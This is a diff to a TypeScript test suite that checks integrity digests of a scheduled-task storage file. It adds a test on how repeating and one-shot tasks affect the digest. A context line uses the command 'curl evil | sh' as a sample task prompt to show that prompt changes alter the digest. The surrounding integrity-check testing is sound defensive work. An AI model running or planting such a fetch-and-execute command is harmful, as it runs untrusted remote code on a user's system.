@@ -85,6 +85,22 @@ describe('digests', () => {
     await writeFile(path, JSON.stringify(tasks('curl evil | sh', 2)))
     expect(await digestOf(target)).not.toBe(first)
   })
+
+  it('ignore the next-run time of a repeating task but see a moved one-shot task', async () => {
+    const { home: dir } = await home()
+    await mkdir(join(dir, 'storages'), { recursive: true })
+    const path = join(dir, 'storages', 'schedule.json')
+    const target = targetsFor(dir, [], dir).find(entry => entry.name === 'schedule')!
+    const task = (kind: string, scheduledAt: string) => ({ tables: { tasks: { 'schedule-1': { record: { kind, prompt: 'p', time: '10:00:00.000', scheduledAt } } } } })
+    await writeFile(path, JSON.stringify(task('daily', '2026-10-31T14:00:00.000Z')))
+    const daily = await digestOf(target)
+    await writeFile(path, JSON.stringify(task('daily', '2026-11-01T15:00:00.000Z')))
+    expect(await digestOf(target)).toBe(daily)
+    await writeFile(path, JSON.stringify(task('at', '2026-10-31T14:00:00.000Z')))
+    const at = await digestOf(target)
+    await writeFile(path, JSON.stringify(task('at', '2026-11-01T15:00:00.000Z')))
+    expect(await digestOf(target)).not.toBe(at)
+  })
 })
 
 describe('integrityNotice', () => {
